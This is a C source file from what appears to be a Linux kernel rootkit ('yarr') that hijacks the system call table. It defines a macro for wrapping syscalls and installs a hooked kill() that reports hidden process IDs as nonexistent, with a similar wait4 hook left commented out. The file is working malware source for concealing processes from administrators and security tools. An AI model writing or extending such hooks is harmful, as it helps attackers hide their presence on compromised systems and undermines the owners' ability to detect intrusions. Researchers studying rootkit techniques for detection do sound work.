#include <asm/unistd.h>
#include <linux/errno.h>
#include <linux/syscalls.h>

#include "hook_syscalls.h"
#include "log.h"
#include "hidepid.h"

unsigned long *orig_sct = NULL;

#define __CAST_TO_SYSCALL(ptr) ((long (*)(const struct pt_regs *))(ptr))

#define YARRHOOK_DEFINE(s_name, code)                                      \
    asmlinkage long __yarr__x64_sys_##s_name(const struct pt_regs *regs) {  \
        long (*__x64_sys_##s_name)(const struct pt_regs *);                 \
                                                                            \
        if (regs == NULL) {                                                 \
            yarr_log("regs are NULL");                                      \
            return -1;                                                      \
        }                                                                   \
                                                                            \
        {code}                                                              \
                                                                            \
        __x64_sys_##s_name = __CAST_TO_SYSCALL(orig_sct[__NR_##s_name]);    \
        return __x64_sys_##s_name(regs);                                    \
    }
        
YARRHOOK_DEFINE(kill,
        if (pid_is_hidden(regs->di)) {
            return -ESRCH;
        })

// TODO: The __yarr__x64_sys_<name>() clearly follow a pattern, we should
// create a macro that declares all the stub needed. Pretty much as the macro
// SYSCALL_DEFINEx() does in the kernel source.

//asmlinkage long __yarr__x64_sys_wait4(const struct pt_regs *regs) {
//    pid_t pid;
//    long (*__x64_sys_wait4)(const struct pt_regs *);
//
//    if (regs == NULL) {
//        yarr_log("regs are NULL");
//        return -1;
//    }
//    
//    pid = regs->di;
//    if (pid_is_hidden(pid)) {
//        return -ESRCH;
//    }
//
//    __x64_sys_wait4 = __CAST_TO_SYSCALL(orig_sct[__NR_kill]);
//    return __x64_sys_wait4(regs);
//}

//asmlinkage long __yarr__x64_sys_kill(const struct pt_regs *regs) {
//    pid_t pid;
//    long (*__x64_sys_kill)(const struct pt_regs *);
//
//    if (regs == NULL) {
//        yarr_log("regs are NULL");
//        return -1;
//    }
//
//    pid = regs->di;
//    if (pid_is_hidden(pid)) {
//        return -ESRCH;
//    }
//
//    __x64_sys_kill = __CAST_TO_SYSCALL(orig_sct[__NR_kill]);
//    return __x64_sys_kill(regs);
//}

int hook_syscalls(unsigned long *fake_sct, unsigned long *real_sct) {
    if (fake_sct == NULL || real_sct == NULL) {
        yarr_log("Syscall tables are NULL");
        return -1;
    }

    // We should be called just once. Write down the address of the
    // syscall table of the system, the real one.
    if (orig_sct != NULL) {
        yarr_log("Double call detected!");
        return -1;
    } else {
        orig_sct = real_sct;
    }

    // We hook in the fake_sct (the one we should put in-place) every system
    // call we need to. Ideally we will end up with every (or almost) system
    // call hooked.
//    fake_sct[__NR_wait4] = (unsigned long)__yarr__x64_sys_wait4;
    fake_sct[__NR_kill] = (unsigned long)__yarr__x64_sys_kill;
    return 0;
}

